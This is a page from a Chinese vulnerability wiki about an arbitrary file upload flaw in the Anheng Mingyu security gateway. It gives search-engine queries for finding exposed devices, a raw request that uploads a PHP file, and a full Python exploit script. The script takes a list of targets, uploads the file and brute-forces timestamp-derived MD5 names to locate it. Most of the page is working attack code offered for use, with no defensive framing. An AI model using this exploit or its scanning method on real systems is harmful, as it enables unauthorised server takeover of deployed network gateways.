<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3net_dynamic_pop_adv_submit%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u5b89\u6052\u660e\u5fa1\u5b89\u5168\u7f51\u5173net_dynamic_pop_adv_submit\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
          ]},
          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
          ]},
          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
          ]},
          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
          ]},
          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        安恒明御安全网关sslvpn_client存在远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_wchat_submit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_wchat_submit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="net_dynamic_pop_adv_submit">安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞<a class="headerlink" href="#net_dynamic_pop_adv_submit" title="Permanent link">&para;</a></h1>
<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
<p>安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞。攻击者可通过该漏洞获取服务器权限。</font></p>
<h1 id="_2"><font style="color:rgb(0, 0, 0);">二、影响版本</font><a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
<ul>
<li>安恒明御安全网关</li>
</ul>
<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
<ul>
<li>hunter<code>app.name="安恒明御安全网关"</code></li>
<li>fofa<code>title="明御安全网关"</code></li>
<li>特征</li>
</ul>
<p><img alt="image" src="https://github.com/user-attachments/assets/c02b591e-4d86-4929-8096-2c3c2b5d1af9" /></p>
<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
<p><div class="highlight"><pre><span></span><code>POST /webui/?g=net_dynamic_pop_adv_submit HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 196
Content-Type: multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd

--qqobiandqgawlxodfiisporjwravxtvd
Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;9B9Ccd.php&quot;
Content-Type: text/plain

2ZqGNnsjzzU2GBBPyd8AIA7QlDq
--qqobiandqgawlxodfiisporjwravxtvd--
</code></pre></div>
文件上传位置
<div class="highlight"><pre><span></span><code>文件会以时间戳md5的方式存储在/adv/image/md5(时间戳).php
</code></pre></div>
python利用脚本
<div class="highlight"><pre><span></span><code>import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import hashlib

def read_file(file_path):
    with open(file_path, &#39;r&#39;) as file:
        urls = file.read().splitlines()
    return urls
def check(url):
        url = url.rstrip(&quot;/&quot;)
        target = urljoin(url,&quot;/webui/?g=net_dynamic_pop_adv_submit&quot;)
        headers = {
            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&quot;,
            &quot;Connection&quot;: &quot;close&quot;,
            &quot;Content-Length&quot;: &quot;203&quot;,
            &quot;Accept-Encoding&quot;: &quot;gzip&quot;,
            &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd&quot;
        }
        data=&quot;--qqobiandqgawlxodfiisporjwravxtvd\nContent-Disposition: form-data; name=\&quot;filename\&quot;; filename=\&quot;9B9Ccd.php\&quot;\nContent-Type: text/plain\n\n2ZqGNnsjzzU2GBBPyd8AIA7QlDq\n--qqobiandqgawlxodfiisporjwravxtvd--&quot;
            # 获取当前时间的UNIX时间戳（毫秒级）
        try:
            proxy_address = &#39;http://127.0.0.1:8080&#39;
            proxies = {
                    &#39;http&#39;: proxy_address,
                    &#39;https&#39;: proxy_address
            }
            response = requests.post(target, headers=headers, data=data, verify=False,timeout=3)#,proxies=proxies)
            if response.status_code != 200  or &#39;g=net_dynamic_pop_adv&#39; not in response.text:
                print(f&quot;\033[31m未找到:{url}: 不存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m&quot;)
                return True 
            else:
                print(f&quot;\033[31m{url}地址存在安恒net_dynamic_pop_adv_submit文件上传漏洞，开始爆破(由于该网关很多设备时间不对，可能找不到上传文件，可循环爆破一整天的时间，即加/减86400秒，大概率可找到)\033[0m&quot;)
            current_unix_timestamp_ms = int(time.time())
            for i in range(1, 20):
                current_unix_timestamp_ms1 = (current_unix_timestamp_ms-5)+i
                # 打印当前的UNIX时间戳（毫秒级）
                print(&quot;第一次破解（北京时间）：当前地址&quot;,url,&quot;UNIX时间戳（毫秒级）:&quot;, current_unix_timestamp_ms1)
                # 将时间戳转换为字符串，因为hashlib不能直接对整数进行哈希
                timestamp_str = str(current_unix_timestamp_ms1)
                # 创建一个md5哈希对象
                md5_hash = hashlib.md5()
                # 更新哈希对象的内容，传递字符串的bytes表示
                md5_hash.update(timestamp_str.encode(&#39;utf-8&#39;))
                # 获取十六进制表示的哈希值字符串
                md5_result = md5_hash.hexdigest()
                # 打印MD5加密后的结果
                print(&quot;第一次破解（北京时间）：当前地址&quot;,url,&quot;UNIX时间戳（毫秒级）的MD5加密结果:&quot;, md5_result)
                target1 = urljoin(url,&quot;/adv/image/%s.php&quot; % md5_result)
                headers1 = {
                    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&quot;,
                }
                response1 = requests.get(target1, headers=headers1, verify=False,timeout=5)#,proxies=proxies)
                if response1.status_code == 200  and &#39;2ZqGNnsjzz&#39; in response1.text:
                    print(f&quot;\033[31mDiscovered:{url}/adv/image/{md5_result}.php: 存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m&quot;)
                    return True
            for i in range(1, 20):
                current_unix_timestamp_ms2 = (current_unix_timestamp_ms+600)+i
                # 打印当前的UNIX时间戳（毫秒级）
                print(&quot;第二次破解（快10分钟）：当前地址&quot;,url,&quot;UNIX时间戳（毫秒级）:&quot;, current_unix_timestamp_ms2)
                # 将时间戳转换为字符串，因为hashlib不能直接对整数进行哈希
                timestamp_str = str(current_unix_timestamp_ms2)
                # 创建一个md5哈希对象
                md5_hash = hashlib.md5()
                # 更新哈希对象的内容，传递字符串的bytes表示
                md5_hash.update(timestamp_str.encode(&#39;utf-8&#39;))
                # 获取十六进制表示的哈希值字符串
                md5_result = md5_hash.hexdigest()
                # 打印MD5加密后的结果
                print(&quot;第二次破解（快10分钟）：当前地址&quot;,url,&quot;UNIX时间戳（毫秒级）的MD5加密结果:&quot;, md5_result)
                target2 = urljoin(url,&quot;/adv/image/%s.php&quot; % md5_result)
                headers2 = {
                    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36&quot;,
                }   
                response2 = requests.get(target2, headers=headers2, verify=False,timeout=5)#,proxies=proxies)
                if response2.status_code == 200  and &#39;2ZqGNnsjzz&#39; in response2.text:
                    print(f&quot;\033[31mDiscovered爆破成功，找到上传文件:{url}/adv/image/{md5_result}.php: 存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m&quot;)
                    return True   
        except Exception as e:
            pass
if __name__ == &quot;__main__&quot;:
    parser = argparse.ArgumentParser()
    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;URL&quot;)
    parser.add_argument(&quot;-f&quot;, &quot;--txt&quot;, help=&quot;file&quot;)
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        # 记录当前时间
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print(&quot;help&quot;)
</code></pre></div></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        安恒明御安全网关sslvpn_client存在远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_wchat_submit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_wchat_submit%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>